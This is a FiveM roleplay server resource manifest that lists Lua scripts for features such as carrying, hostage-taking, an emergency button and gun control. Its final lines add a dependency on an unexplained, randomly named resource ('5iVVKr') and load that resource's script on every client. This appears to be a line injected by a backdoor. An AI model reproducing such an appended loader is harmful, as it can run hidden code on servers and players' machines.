resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
    'config.lua',
    'server/roleplay.lua',
    'server/carry.lua',
    'server/takehostage.lua',
    'server/piggyback.lua',
    'server/verkeerslichtfix.lua',
    'server/watertank.lua',
    'server/colatank.lua',
    'server/afk.lua',
    'server/guncontrol.lua',
    'server/noodknop.lua',
    'server/me.lua',
    'server/delwapen.lua',

}
client_script {
    'config.lua',
    'client/roleplay.lua',
    'client/surrender.lua',
    'client/crouch.lua',
    'client/handsup.lua',
    'client/fingerpoint.lua',
    'client/carry.lua',
    'client/takehostage.lua',
    'client/piggyback.lua',
    'client/stoplichtfixes.lua',
    'client/verkeerslichtfix.lua',
    'client/brancard.lua',
    'client/watertank.lua',
    'client/watertankF.lua',
    'client/colatank.lua',
    'client/colatankF.lua',
    'client/pvp.lua',
    'client/crosshair.lua',
    'client/afk.lua',
    'client/duwvoertuig.lua',
    'client/shuffle.lua',
    'client/guncontrol.lua',
    'client/noodknop.lua',
    'client/me.lua', 
    'client/richprecense.lua',
    'client/delwapen.lua',
}


dependency '5iVVKr'
client_script '@5iVVKr/5iVVKr.lua'
